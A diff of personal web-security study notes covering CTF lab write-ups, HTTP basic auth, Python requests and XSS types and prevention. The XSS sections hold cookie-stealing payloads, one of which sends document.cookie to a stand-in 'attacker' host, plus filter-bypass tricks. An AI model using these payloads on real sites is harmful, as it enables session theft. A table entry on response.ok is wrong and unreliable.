@@ -930,11 +930,165 @@ And the last template is `lose.html`:
 
 
 
+### client-side-again
+
+js obfusacation
+
+![image-20240504142110129](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504142110129.png)
+
+picoCTF{not_this_again_50a029}
+
+#### js obfuscation
+
+
+
+Codes written in many languages are published and executed without being compiled in interpreted languages, such as Python,PHP, and JavaScript. While Python and PHP usually reside on the server-side and hence are hidden from end-users, JavaScript is usually used within browsers at the client-side, and the code is sent to the user and executed in cleartext. This is why obfuscation is very often used with JavaScript.
+
+*It must be noted that doing authentication or encryption on the client-side is not recommended, as code is more prone to attacks this way.*
+
+- concealing data is just one of several dimensions of JS obfuscation. Strong obfuscation will also **obfuscate the layout and program control flow**, as well as include several **optimization** techniques. Typically, it will target:
+  - Identifiers;
+  - Booleans;
+  - Functions;
+  - Numbers;
+  - Predicates;
+  - Regular expressions;
+  - Statements; and
+  - Program control flow.
+
+
+
+##### obfuscation technique
+
+
+
+`console.log("Hello, world! " + 123);`
+
+
+
+**Hexadecimal** string encoding
+
+Each ASCII character of the hardcoded string was converted into hexadecimal form
+
+There’s also another variation of this technique that involves replacing characters with their unicode encoding.
+
+`console["\x6C\x6F\x67"]("\x48\x65\x6C\x6C\x6F\x2C\x20\x77\x6F\x72\x6C\x64\x21\x20"+ 123)`
+
+
+
+**String Array Mapping**
+
+`var _0x8b75=["Hello, world! ","log"];console[_0x8b75[1]](_0x8b75[0]+ 123)`
+
+
+
+**Dead code injection**
+
+
+
+
+
+### 13
+
+
+
+**rot-13**
+
+ROT13 (Rotate13) is a simple letter substitution cipher that replaces a letter with the 13th letter after it in the Latin alphabet. ROT13 is a special case of the Caesar cipher 
+
+![img](https://upload.wikimedia.org/wikipedia/commons/thumb/3/33/ROT13_table_with_example.svg/220px-ROT13_table_with_example.svg.png)
+
+Because there are 26 letters (2×13) in the basic Latin alphabet, ROT13 is its own inverse; that is, to undo ROT13, the same algorithm is applied, so the same action can be used for encoding and decoding. The algorithm provides virtually no cryptographic security, and is often cited as a canonical example of weak encryption.
+
+![image-20240504151833679](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504151833679.png)
+
+![image-20240504151812374](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504151812374.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ## ctfhub
 
 
 
-## HTTP 基本认证
+### HTTP 基本认证
+
+
+
+#### 方法一： python 脚本
+
+![image-20240504113140848](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504113140848.png)
+
+![image-20240504113158854](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504113158854.png)
+
+
+
+#### 方法二 ：burpsuite
+
+![image-20240504114333952](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504114333952.png)
+
+![image-20240504114234643](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504114234643.png)
+
+![image-20240504114303419](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504114303419.png)
+
+
+
+
+
+
+
+### xss
+
+
+
+#### 反射型
+
+
+
+**actor ：**
+
+我作为攻击者，目标是获取另一个用户的Cookie，因此在第一个输入框内 `<script>alert(document.cookie)</script>` 是无意义的 。但通过对此输入框的测试 `<h1>Test xss</h1>` 可以得出此输入框是一个 xss 攻击点， 可在此处构造 payload 获取敏感信息。
+
+正常情况下我需要获取另一个用户在此网站的cookie( victim ) , 但作为一个测试环境，没有这个用户存在，因此将此 URL 发送给后台 bot，bot 模拟victim 点击行为，执行script脚本内容( src="..." ) ,  将会加载此网页 ，发送请求到 xss platform 地址，request 会包含victim在此网站的cookie和相关信息，被 xss platform 记录
+
+xss platform 网址 ：https://xssaq.com/
+
+**bot**
+
+*A bot, short for robot, is an automated program that performs tasks on the internet. Bots can be simple, like those that crawl web pages for search engines, or complex, like AI chatbots that engage in conversations with users.*
+
+
+
+![image-20240505151746029](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505151746029.png)
+
+![image-20240505151306027](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505151306027.png)
 
 
 
@@ -944,7 +1098,114 @@ And the last template is `lose.html`:
 
 
 
+#### 过滤空格
 
+尝试`<script type="text/javascript">alert(1)</script>`， 
+
+发现空格被过滤 `http://challenge5798073c7e365102.sandbox.ctfhub.com:10800/name=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%281%29%3C%2Fscript%3E`
+
+- HTML实体编码： `&nbsp;` , `&#32;`
+- URL编码：`%20`
+- Unicode编码：`\u0020`
+- ![image-20240505161152530](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505161152530.png)
+
+![image-20240505160546070](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505160546070.png)
+
+
+
+
+
+
+
+#### xss 关键词过滤
+
+尝试 `<script>alert(1)</script>`
+
+![image-20240505164644699](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164644699.png)
+
+ 将 s 改为 S 成功。
+
+
+
+![image-20240505164906653](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164906653.png)
+
+![image-20240505164854180](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164854180.png)
+
+
+
+
+
+
+
+#### 存储型
+
+存储型是将恶意代码存储在 server端， victim 访问该受损网站时加载恶意代码，从而敏感信息泄露。
+
+
+
+首先 post 恶意代码到server端
+
+![image-20240505163952400](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505163952400.png)
+
+
+
+现在此网站受损，访问此网站的用户都会加载恶意代码， 向 src 地址发送 request ，暴露此用户在此网站的cookie
+
+
+
+然后bot模拟用户点击行为，访问此网站，加载恶意代码。
+
+![image-20240505164144914](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164144914.png)
+
+
+
+![image-20240505164315090](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164315090.png)
+
+
+
+
+
+
+
+#### DOM 反射
+
+![image-20240505184508085](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505184508085.png)
+
+
+
+![image-20240505185654461](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505185654461.png)
+
+![image-20240505185957173](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505185957173.png)
+
+![image-20240505185938760](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505185938760.png)
+
+
+
+
+
+
+
+#### DOM跳转
+
+https://blog.csdn.net/weixin_49125123/article/details/131546660
+
+![image-20240505190537307](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505190537307.png)
+
+`location.search`获取查询字符串部分 ， split方法将字符串拆分为参数名和参数值的数组。
+
+example :
+
+`jumpto=http://challenge1ccc67ea8612a9b6.sandbox[ctfhub(https://so.csdn.net/so/searchq=ctfhub&spm=1001.2101.3001.7020).com:10800/`）
+
+`target[0].slice(1)`=="jumpto"，target[0]包含"?“字符，使用`.slice(1)`去掉”?"。
+
+如果相等，就使用`location.href`将页面重定向到`target[1]`，也就是参数值所指定的URL。
+
+
+
+![image-20240505192740432](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505192740432.png)
+
+![image-20240505192705892](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505192705892.png)
 
 
 
@@ -1259,7 +1520,106 @@ pass the session IDs as **a parameter in URLs or store them in the cookies**.
 
 
 
+## HTTP basic authentication
 
+https://en.wikipedia.org/wiki/Basic_access_authentication
+
+a method for an HTTP user agent (e.g. a web browser) to provide a user name and password when making a request. In basic HTTP authentication, a request contains a header field in the form of `Authorization: Basic <credentials>`, where `<credentials>` is the Base64 encoding of ID and password joined by a single colon `:`.
+
+HTTP Basic authentication (BA) implementation is the simplest technique for enforcing access controls to web resources because it does not require cookies, session identifiers, or login pages; rather, HTTP Basic authentication uses standard fields in the HTTP header.
+
+
+
+#### framework
+
+[RFC 7235](https://datatracker.ietf.org/doc/html/rfc7235) defines the HTTP authentication framework, which can be used by a server to [challenge](https://developer.mozilla.org/en-US/docs/Glossary/Challenge) a client request, and by a client to provide authentication information.
+
+1. The server responds to a client with a [`401`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/401) (Unauthorized) response status and provides information on how to authorize with a [`WWW-Authenticate`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate) response header containing at least one challenge.
+2. A client that wants to authenticate include an [`Authorization`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization) request header with credentials.
+3. Usually a client will present a password prompt to the user and will then issue the request including the correct `Authorization` header.
+
+![A sequence diagram illustrating HTTP messages between a client and a server lifeline.](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication/http-auth-sequence-diagram.png)
+
+**Warning:** The "Basic" authentication scheme used in the diagram above sends the credentials encoded but not encrypted. This would be completely insecure unless the exchange was over a secure connection (HTTPS/TLS).
+
+
+
+If a (proxy) server receives valid credentials that are *inadequate* to access a given resource, the server should respond with the [`403`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403) `Forbidden` status code. Unlike [`401`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/401) `Unauthorized` or [`407`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/407) `Proxy Authentication Required`, authentication is impossible for this user and browsers will not propose a new attempt.
+
+In all cases, the server may prefer returning a [`404`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/404) `Not Found` status code, to hide the existence of the page to a user without adequate privileges or not correctly authenticated.
+
+
+
+### protocol
+
+
+
+
+
+
+
+#### WWW-Authenticate
+
+When the server wants the user agent to authenticatet, it must send a response with a ***HTTP 401** Unauthorized* status line and a ***WWW-Authenticate*** header field
+
+- syntax: `"WWW-Authenticate: <type> realm=<realm>"`
+  - `<type>` is the authentication scheme ( "Basic" is the most common scheme ). 
+  - The *`realm`* is used to describe the protected area or to indicate the scope of protection. This could be a message like "Access to the staging site" or similar, so that the user knows to which space they are trying to get access to.
+
+
+
+#### Authorization
+
+The **`Authorization`** header is usually, but not always, sent after the user agent first attempts to request a protected resource without credentials. 
+
+
+
+
+
+- **syntax** : `Authorization: <auth-scheme> <authorization-parameters>`
+
+  - `<auth-scheme>`
+
+    The [Authentication scheme](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication#authentication_schemes) that defines how the credentials are encoded. Some of the more common types are (case-insensitive): `Basic`, `Digest`, `Negotiate` and `AWS4-HMAC-SHA256`.
+
+    - Basic authentication
+
+      `Authorization: Basic <credentials>`
+
+    - Digest(摘要) authentication
+
+      ```
+      Authorization: Digest username=<username>,
+          realm="<realm>",
+          uri="<url>",
+          algorithm=<algorithm>,
+          nonce="<nonce>",
+          nc=<nc>,
+          cnonce="<cnonce>",
+          qop=<qop>,
+          response="<response>",
+          opaque="<opaque>"
+      ```
+
+      
+
+##### Basic authentication
+
+1. The username and password are combined with a single colon (:) 
+
+2. The resulting string is encoded into an octet sequence. 
+
+   The character set is by default unspecified, as long as it is compatible with US-ASCII, but the server may suggest use of UTF-8 by sending the ***charset*** parameter.
+
+3. The resulting string is encoded using a variant of Base64 (+/ and with padding).
+
+4. The authorization method and a space character (e.g. **"Basic "**) is then prepended to the encoded string.
+
+- For example, if the browser uses *Aladdin* as the username and *open sesame* as the password
+
+  field's value :  Base64 encoding of *`Aladdin:open sesame`*, *QWxhZGRpbjpvcGVuIHNlc2FtZQ==*. 
+
+   *Authorization* header field  :`Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==`
 
 
 
@@ -1544,21 +1904,113 @@ with urllib.request.urlopen(req) as response:
 
 
 
+## requests
 
+
+
+### `get()` method
+
+`requests.get(url, params={key, value}, args)`
+
+
+
+#### Parameters
+
+| *url*           | Required. The url of the request                             |
+| --------------- | ------------------------------------------------------------ |
+| params          | Optional. A dictionary, list of tuples or bytes to send as a query string. Default `None` |
+| allow_redirects | Optional. A Boolean to enable/disable redirection. Default `True` (allowing redirects) |
+| auth            | Optional. A tuple to enable a certain HTTP authentication. Default `None`                                                                                                                   `x = requests.get(url, auth = ('user', 'pass'))` |
+| cert            | Optional. A String or Tuple specifying a cert file or key. Default `None` |
+| cookies         | Optional. A dictionary of cookies to send to the specified url. Default `None `                                                                                                                  `x = requests.get(url, cookies = {"favcolor": "Red"})` |
+| headers         | Optional. A dictionary of HTTP headers to send to the specified url. Default `None`                                                                                                    `x = requests.get(url, headers = {"HTTP_HOST": "MyVeryOwnHost"})` |
+| proxies         | Optional. A dictionary of the protocol to the proxy url. Default `None` |
+| stream          | Optional. A Boolean indication if the response should be immediately downloaded (False) or streamed (True). Default `False` |
+| timeout         | Optional. A number, or a tuple, indicating how many seconds to wait for the client to make a connection and/or send a response. Default `None` which means the request will continue until the connection is closed |
+| verify          | Optional. A Boolean or a String indication to verify the servers TLS certificate or not. Default `True` |
+
+**return value**
+
+The get() method returns a `requests.Response object`
+
+
+
+
+
+#### Authentication using Requests
+
+https://www.geeksforgeeks.org/authentication-using-python-requests/
+
+provides authentication data through Authorization header or a custom header defined by server.
+
+```python
+from requests.auth import HTTPBasicAuth 
+# Making a get request 
+response = requests.get('https://api.github.com / user, ', 
+            auth = HTTPBasicAuth('user', 'pass')) 
+# Replace “user” and “pass” with your username and password. It will authenticate the request and return a response 200 or else it will return error 403.
+```
+
+
+
+
+
+
+
+### Response object
+
+When one makes a request to a URI, it returns a response. This Response object in terms of python is returned by requests.method(), method being – get, post, put, etc. 
+
+
+
+#### Response Methods
+
+
+
+|             Method             |                         Description                          |
+| :----------------------------: | :----------------------------------------------------------: |
+|        response.headers        |  response.headers returns a dictionary of response headers.  |
+|       response.encoding        | response.encoding returns the encoding used to decode response.content. |
+|        response.elapsed        | response.elapsed returns a timedelta object with the time elapsed from sending the request to the arrival of the response. |
+|        response.close()        |    response.close() closes the connection to the server.     |
+|        response.content        | response.content returns the content of the response, in bytes. |
+|        response.cookies        | response.cookies returns a CookieJar object with the cookies sent back from the server. |
+|        response.history        | response.history returns a list of response objects holding the history of request (url). |
+| response.is_permanent_redirect | response.is_permanent_redirect returns True if the response is the permanent redirected url, otherwise False. |
+|      response.is_redirect      | response.is_redirect returns True if the response was redirected, otherwise False. |
+|    response.iter_content()     | response.iter_content() iterates over the response.content.  |
+|        response.json()         | response.json() returns a JSON object of the result (if the result was written in JSON format, if not it raises an error). |
+|          response.url          |        response.url returns the URL of the response.         |
+|         response.text          | response.text returns the content of the response, in unicode. |
+|      response.status_code      | response.status_code returns a number that indicates the status (200 is OK, 404 is Not Found). |
+|        response.request        | response.request returns the request object that requested this response. |
+|        response.reason         | response.reason returns a text corresponding to the status code. |
+|          response.ok           | response.ok returns True if status_code is less than 200, otherwise False. |
+|         response.links         |           response.links returns the header links.           |
+
+
+
+
+
+### Session objects
+
+Session object allows one to persist(保持) certain parameters across requests. It also persists cookies across all requests made from the Session instance and will use urllib3’s connection pooling. So if several requests are being made to the same host, the underlying TCP connection will be reused, which can result in a significant performance increase. A session object all the methods as of requests.
 
 ```python
 import requests
-import json
 
-url = 'http://example.com/api/data'
-data = {'key': 'value'}
+s = requests.Session()
 
-# 发送 POST 请求并将 JSON 数据传递给 data 参数
-response = requests.post(url, json=data)
+# make a get request 
+s.get('https://httpbin.org/cookies/set/sessioncookie/123456789') 
+  
+# again make a get request 
+r = s.get('https://httpbin.org/cookies') 
 
-# 打印响应内容
-print(response.text)
+
 ```
+
+
 
 
 
@@ -1692,20 +2144,498 @@ app.secret_key = 'any random string’
 
 
 
-# js obfuscation
 
 
 
-Codes written in many languages are published and executed without being compiled in interpreted languages, such as Python,PHP, and JavaScript. While Python and PHP usually reside on the server-side and hence are hidden from end-users, JavaScript is usually used within browsers at the client-side, and the code is sent to the user and executed in cleartext. This is why obfuscation is very often used with JavaScript.
 
-*It must be noted that doing authentication or encryption on the client-side is not recommended, as code is more prone to attacks this way.*
+# XSS
 
-- concealing data is just one of several dimensions of JS obfuscation. Strong obfuscation will also **obfuscate the layout and program control flow**, as well as include several **optimization** techniques. Typically, it will target:
-  - Identifiers;
-  - Booleans;
-  - Functions;
-  - Numbers;
-  - Predicates;
-  - Regular expressions;
-  - Statements; and
-  - Program control flow.
+## Introduction
+
+### malicious javascript
+
+- JavaScript has access to some of the user's sensitive information, such as cookies.
+- JavaScript can send HTTP requests with arbitrary content to arbitrary destinations by using `XMLHttpRequest` and other mechanisms.
+- JavaScript can make arbitrary modifications to the HTML of the current page by using DOM manipulation methods.
+
+
+
+*the ability to execute arbitrary JavaScript in another user's browser allows an attacker to perform the following types of attacks:*
+
+**Cookie theft**
+
+The attacker can access the victim's cookies associated with the website using `document.cookie`, send them to his own server, and use them to extract sensitive information like session IDs.
+
+**Keylogging**
+
+The attacker can register a keyboard event listener using `addEventListener` and then send all of the user's keystrokes to his own server, potentially recording sensitive information such as passwords and credit card numbers.
+
+**Phishing**
+
+The attacker can insert a fake login form into the page using DOM manipulation, set the form's `action` attribute to target his own server, and then trick the user into submitting sensitive information.
+
+
+
+### Actors in an XSS attack
+
+Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise( 破坏 ) their interaction with the application.
+
+![image-20240504183834667](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504183834667.png)
+
+In general, an XSS attack involves three actors: **the website**, **the victim**, and **the attacker**.
+
+- **The website** serves HTML pages to users who request them. In our examples, it is located at `http://website/`.
+  - **The website's database** is a database that stores some of the user input included in the website's pages.
+- **The victim** is a normal user of the website who requests pages from it using his browser.
+- **The attacker** is a malicious user of the website who intends to launch an attack on the victim by exploiting an XSS vulnerability in the website.
+  - **The attacker's server** is a web server controlled by the attacker for the sole purpose of stealing the victim's sensitive information. In our examples, it is located at `http://attacker/`.
+
+
+
+
+
+
+
+
+
+## Types of XSS
+
+https://edricteo.com/xss/
+
+- **Stored XSS** −  also known as persistent XSS 
+
+  occurs when user input is stored on the target server such as database/message forum/comment field etc. Then the victim is able to retrieve the stored data from the web application.
+
+- **Reflected XSS** −  also known as non-persistent XSS 
+
+  occurs when user input is immediately returned by a web application in an error message/search result or the input provided by the user as part of the request and without permanently storing the user provided data.
+
+- **DOM Based XSS** 
+
+  a form of XSS when the source of the data is in the DOM, the sink is also in the DOM, and the data flow never leaves the browser.
+
+
+
+### Reflected CSS
+
+Reflected XSS attacks occur when a web application or API sends user-supplied data back to the browser without proper validation or escaping. This vulnerability is often found in search engines, forms, and other mechanisms that reflect user input as part of their immediate response.
+
+Imagine a search function on a website that directly includes user input in its response. An attacker could craft a URL with a search term that includes a malicious script. When a user clicks on this link, the script executes in their browser. For instance, the URL might be `http://example.com/search?q=<script>alert('XSS')</script>`. If the search term is reflected as-is in the search result page, it would execute the script.
+
+
+
+#### **example:**
+
+![Diagram of a persistent XSS attack](https://excess-xss.com/reflected-xss.png)
+
+
+
+
+
+#### How can reflected XSS succeed?
+
+At first, reflected XSS might seem harmless because it requires the victim himself to actually send a request containing a malicious string. Since nobody would willingly attack himself, there seems to be no way of actually performing the attack.
+
+As it turns out, there are at least two common ways of causing a victim to launch a reflected XSS attack against himself:
+
+- If the user targets a specific individual, the attacker can send the malicious URL to the victim (using e-mail or instant messaging, for example) and trick him into visiting it.
+- If the user targets a large group of people, the attacker can publish a link to the malicious URL (on his own website or on a social network, for example) and wait for visitors to click it.
+
+These two methods are similar, and both can be more successful with the use of a URL shortening service, which masks the malicious string from users who might otherwise identify it.
+
+
+
+- **服务器端代码**
+
+  ```php
+  <?php 
+  // Is there any input? 
+  if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
+      // Feedback for end user 
+      echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
+  } 
+  ?>
+  可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。
+  ```
+
+  
+
+
+
+### Stored XSS
+
+Stored cross-site scripting (also known as second-order or persistent XSS) 
+
+Stored XSS attacks occur when the malicious script is permanently stored on the target system, such as in a database, message board, comment field, or any other location where data is stored. Each time users access this data, the script gets executed in their browser.
+
+Consider a forum where users can post messages. An attacker posts a message containing a script, such as `<script>fetch('/steal-cookie').then(response => document.write(response))</script>`. Every user who views this message will execute the script, potentially leading to cookie theft or other malicious actions.
+
+#### example 
+
+assume that the attacker's ultimate goal is to steal the victim's cookies by exploiting( 利用 ) an XSS vulnerability in the website.
+
+ This can be done by having the victim's browser parse HTML code:
+
+`<script>window.location='http://attacker/?cookie='+document.cookie</script>`
+
+This script navigates the user's browser to a different URL, triggering an HTTP request to the attacker's server. **The URL includes the victim's cookies as a query parameter, which the attacker can extract from the request** .
+
+ Once the attacker has acquired the cookies, he can use them to impersonate( 假冒 ) the victim and launch further attacks.
+
+![Diagram of a persistent XSS attack](https://excess-xss.com/persistent-xss.png)
+
+
+
+
+
+In terms of exploitability, the key difference between reflected and stored XSS is that a stored XSS vulnerability enables attacks that are self-contained within the application itself. The attacker does not need to find an external way of inducing other users to make a particular request containing their exploit. Rather, the attacker places their exploit into the application itself and simply waits for users to encounter it.
+
+The self-contained nature of stored cross-site scripting exploits is particularly relevant in situations where an XSS vulnerability only affects users who are currently logged in to the application. If the XSS is reflected, then the attack must be fortuitously timed: a user who is induced to make the attacker's request at a time when they are not logged in will not be compromised. In contrast, if the XSS is stored, then the user is guaranteed to be logged in at the time they encounter the exploit
+
+
+
+### DOM-based XSS
+
+https://portswigger.net/web-security/cross-site-scripting/dom-based
+
+DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink(接收器) that supports dynamic code execution, such as `eval()` or `innerHTML`. 
+
+
+
+#### example
+
+the attack payload is executed as a result of modifying the Document Object Model (DOM) of the web page in the client side, often in response to some user action like clicking a link or submitting a form. This type of attack occurs entirely in the browser and does not involve server-side processing of the malicious data.
+
+Consider a web application that uses JavaScript to process and display URL parameters. An attacker could manipulate the URL to include a script, like `http://example.com/page.html#<script>alert('XSS')</script>`. If the JavaScript code naively uses the fragment of the URL to modify the DOM, it could execute the script.
+
+![Diagram of a DOM-based XSS attack](https://excess-xss.com/dom-based-xss.png)
+
+1. The attacker crafts a URL containing a malicious string and sends it to the victim.
+2. The victim is tricked by the attacker into requesting the URL from the website.
+3. The website receives the request, but does not include the malicious string in the response.
+4. The victim's browser executes the legitimate script inside the response, causing the malicious script to be inserted into the page.
+5. The victim's browser executes the malicious script inserted into the page, sending the victim's cookies to the attacker's server.
+
+
+
+#### What makes DOM-based XSS different
+
+In the previous examples of persistent and reflected XSS attacks, the server inserts the malicious script into the page, which is then sent in a response to the victim. **When the victim's browser receives the response, it assumes the malicious script to be part of the page's legitimate content and automatically executes it during page load **
+
+In the example of a DOM-based XSS attack, however, there is no malicious script inserted as part of the page; the only script that is automatically executed during page load is a legitimate part of the page. The problem is that this legitimate script directly makes use of user input in order to add HTML to the page. Because the malicious string is inserted into the page using `innerHTML`, it is parsed as HTML, causing the malicious script to be executed.
+
+
+
+The difference is subtle but important:
+
+- In traditional XSS, the malicious JavaScript is executed when the page is loaded, as part of the HTML sent by the server.
+- In DOM-based XSS, the malicious JavaScript is executed at some point after the page has loaded, as a result of the page's legitimate JavaScript treating user input in an unsafe way.
+
+
+
+#### Why DOM-based XSS matters
+
+In the previous example, JavaScript was not necessary; the server could have generated all the HTML by itself. If the server-side code were free of vulnerabilities, the website would then be safe from XSS.
+
+However, as web applications become more advanced, an increasing amount of HTML is generated by JavaScript on the client-side rather than by the server. Any time content needs to be changed without refreshing the entire page, the update must be performed using JavaScript. Most notably, this is the case when a page is updated after an AJAX request.
+
+This means that XSS vulnerabilities can be present not only in your website's server-side code, but also in your website's client-side JavaScript code. Consequently, even with completely secure server-side code, the client-side code might still unsafely include user input in a DOM update after the page has loaded. If this happens, the client-side code has enabled an XSS attack through no fault of the server-side code.
+
+
+
+
+
+
+
+
+
+## Methods of preventing XSS
+
+Recall that an XSS attack is a type of code injection: user input is mistakenly interpreted as malicious program code. In order to prevent this type of code injection, secure input handling is needed. 
+
+For a web developer, there are two fundamentally different ways of performing secure input handling:
+
+- **Encoding**, which escapes the user input so that the browser interprets it only as data, not as code.
+- **Validation**, which filters the user input so that the browser interprets it as code without malicious commands.
+
+
+
+### Common features
+
+While these are fundamentally different methods of preventing XSS, they share several common features :
+
+**Context ( where )**
+
+Secure input handling needs to be performed differently depending on where in a page the user input is inserted.
+
+**Inbound/outbound ( when )**
+
+- **inbound** : your website receives the input
+- **outbound:** right before your website inserts the input into a page
+
+**Client/server( who )**
+
+Secure input handling can be performed on the client-side or on the server-side
+
+
+
+#### Input handling contexts
+
+There are many contexts in a web page where user input might be inserted. For each of these, specific rules must be followed so that the user input cannot break out of its context and be interpreted as malicious code. 
+
+ common contexts:
+
+| Context              | Example code                              |
+| :------------------- | :---------------------------------------- |
+| HTML element content | `<div>userInput</div>`                    |
+| HTML attribute value | `<input value="userInput">`               |
+| URL query value      | `http://example.com/?parameter=userInput` |
+| CSS value            | `color: userInput`                        |
+| JavaScript value     | `var name = "userInput";`                 |
+
+
+
+**Why context matters**
+
+In all of the contexts described, an XSS vulnerability would arise if user input were inserted before first being encoded or validated. An attacker would then be able to inject malicious code by simply **inserting the closing delimiter( 分隔符 ) for that context and following it with the malicious code.**
+
+
+
+**example:**
+
+Application code : `<input value="userInput">`
+
+Malicious string : `"><script>...</script><input value=""`
+
+Resulting code : `<input value=""><script>...</script><input value="">`
+
+This could be prevented by simply removing all quotation marks in the user input—but only in this context. If the same input were inserted into another context, the closing delimiter would be different and injection would become possible. 
+
+**secure input handling always needs to be tailored to the context where the user input will be inserted.**
+
+
+
+#### Inbound/outbound input handling
+
+- **inbound** : your website receives the input
+- **outbound:** right before your website inserts the input into a page
+
+Instinctively(本能地）, it might seem that XSS can be prevented by encoding or validating all user input as soon as your website receives it.
+
+This way, any malicious strings should already have been neutralized(失效) whenever they are included in a page, and the scripts generating HTML will not have to concern themselves with secure input handling.
+
+The problem is that, as described previously, user input can be inserted into several contexts in a page. There is no easy way of determining when user input arrives which context it will eventually be inserted into, and the same user input often needs to be inserted into different contexts. Relying on inbound input handling to prevent XSS is thus a very brittle solution that will be prone to errors. (The deprecated "[magic quotes](http://php.net/manual/en/security.magicquotes.php)" feature of PHP is an example of such a solution.)
+
+Instead, outbound input handling should be your primary line of defense against XSS, because it can take into account the specific context that user input will be inserted into. 
+
+
+
+#### client and server side
+
+In order to protect against all types of XSS, secure input handling must be performed in both the server-side code and the client-side code.
+
+- In order to protect against traditional XSS, secure input handling must be performed in server-side code. This is done using any language supported by the server.
+- In order to protect against DOM-based XSS where the server never receives the malicious string (such as [the fragment identifier attack described earlier](https://excess-xss.com/#dom-based-xss-invisible-to-server)), secure input handling must be performed in client-side code. This is done using JavaScript.
+
+
+
+### Encoding
+
+Encoding is the act of escaping user input so that the browser interprets it only as data, not as code. 
+
+The most recognizable encoding in web development is **HTML escaping**, which converts characters `<`  into `&lt;`(less than ),  `>` into `&gt;` (greater than)
+
+**example :**
+
+```
+print "<html>"
+print "Latest comment: "
+print encodeHtml(userInput)
+print "</html>"
+```
+
+If the user input were the string `<script>...</script>`, the resulting HTML would be as follows:
+
+```
+<html>
+Latest comment:
+&lt;script&gt;...&lt;/script&gt
+</html>
+```
+
+Because all characters with special meaning have been escaped, the browser will not parse any part of the user input as HTML.
+
+
+
+#### Encoding on the client-side
+
+When encoding user input on the client-side using JavaScript, there are several built-in methods and properties that automatically encode all data in a context-aware manner:
+
+| Context              | Method/property                                              |
+| :------------------- | :----------------------------------------------------------- |
+| HTML element content | `node.textContent = userInput`                               |
+| HTML attribute value | `element.setAttribute(attribute, userInput)` or `element[attribute] = userInput` |
+| URL query value      | `window.encodeURIComponent(userInput)`                       |
+| CSS value            | `element.style.property = userInput`                         |
+
+
+
+#### Limitations of encoding
+
+Even with encoding, it will be possible to input malicious strings into some contexts. A notable example of this is when user input is used to provide URLs, such as in the example below:
+
+```
+document.querySelector('a').href = userInput
+```
+
+Although assigning a value to the `href` property of an anchor element automatically encodes it so that it becomes nothing more than an attribute value, this in itself does not prevent the attacker from inserting a URL beginning with "`javascript:`". When the link is clicked, whatever JavaScript is embedded inside the URL will be executed.
+
+Encoding is also an inadequate solution when you actually want the user to define part of a page's code. An example is a user profile page where the user can define custom HTML. If this custom HTML were encoded, the profile page could consist only of plain text.
+
+In situations like these, encoding has to be complemented with validation
+
+
+
+
+
+### Validation 认证
+
+Validation is the act of filtering user input so that all malicious parts of it are removed, without necessarily removing all code in it. One of the most recognizable types of validation in web development is allowing some HTML elements (such as `<em>` and `<strong>`) but disallowing others (such as `<script>`).
+
+There are two main characteristics of validation that differ between implementations:
+
+- **Classification strategy**
+
+  User input can be classified using either blacklisting or whitelisting.
+
+- **Validation outcome**
+
+  User input identified as malicious can either be rejected or sanitised.
+
+
+
+#### Classification strategy
+
+
+
+##### Blacklisting
+
+Instinctively, it seems reasonable to perform validation by defining a forbidden pattern that should not appear in user input. If a string matches this pattern, it is then marked as invalid. An example would be to allow users to submit custom URLs with any protocol except `javascript:`. This classification strategy is called *blacklisting*.
+
+**blacklisting has two major drawbacks:**
+
+ Accurately describing the set of all possible malicious strings is usually a very complex task.
+
+The example policy( 策略 ) described above could not be successfully implemented by simply searching for the substring "`javascript`", because this would miss strings of the form "`Javascript:`" (where the first letter is capitalized) and "`javascript:`" (where the first letter is encoded as a numeric character reference).
+
+
+
+**Staleness 陈旧**
+
